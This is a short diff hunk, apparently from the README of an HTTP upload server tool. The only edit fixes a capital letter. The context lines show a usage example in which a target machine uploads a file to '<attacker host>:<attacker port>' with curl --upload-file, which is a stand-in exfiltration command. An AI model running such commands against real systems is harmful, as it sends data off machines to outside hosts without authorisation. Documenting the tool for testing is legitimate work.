@@ -61,7 +61,7 @@ Starting server
 python HTTPutServer.py <attacker host> <attacker port>
 ```
 
-Target Server uploads data
+Target server uploads data
 
 ```
 curl --upload-file test.txt http://<attacker host>:<attacker port>/
